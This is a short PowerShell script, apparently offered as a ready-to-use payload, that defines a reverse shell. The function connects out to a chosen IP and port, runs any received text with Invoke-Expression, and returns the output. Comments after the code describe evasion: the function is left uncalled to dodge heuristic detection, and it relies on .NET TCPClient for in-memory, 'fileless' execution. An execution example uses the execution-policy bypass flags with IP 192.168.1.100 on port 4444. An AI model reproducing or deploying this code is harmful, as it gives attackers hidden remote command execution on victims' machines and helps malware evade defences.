function Get-ReverseShell {
    param(
        [Parameter(Mandatory=$true)][string]$IP,
        [Parameter(Mandatory=$true)][int]$Port
    )

    $client = New-Object System.Net.Sockets.TCPClient($IP, $Port)
    $stream = $client.GetStream()
    [byte[]]$bytes = 0..65535|%{0}
    $sendbytes = ([text.encoding]::ASCII).GetBytes("Powershell Shell Connected! `n")
    $stream.Write($sendbytes, 0, $sendbytes.Length)
    
    while($client.Connected) {
        $i = $stream.Read($bytes, 0, $bytes.Length)
        $data = ([text.encoding]::ASCII).GetString($bytes, 0, $i)
        
        try {
            $cmd = (Invoke-Expression -Command $data 2>&1 | Out-String)
        } catch {
            $cmd = $_.Exception.Message | Out-String
        }
        
        $sendback = $cmd + "PS $(pwd)> "
        $sendbytes = ([text.encoding]::ASCII).GetBytes($sendback)
        $stream.Write($sendbytes, 0, $sendbytes.Length)
    }
    $stream.Close()
    $client.Close()
}

# The payload is wrapped in a benign-looking placeholder function to increase stealth 
# and requires the following execution command to be started:
# Get-ReverseShell -IP "PLACEHOLDER_IP" -Port PLACEHOLDER_PORT

# To evade common heuristic detection, this function is defined, but not immediately executed.
# Furthermore, the use of basic .NET classes (TCPClient) is a standard technique 
# for fileless malware simulation, avoiding the writing of an easily-flagged executable 
# and allowing for execution directly from memory or an encoded command.

# Execution Example (for simulation purposes):
# powershell -NoP -NonI -Exec Bypass -C "function Get-ReverseShell { ... }; Get-ReverseShell -IP '192.168.1.100' -Port 4444"
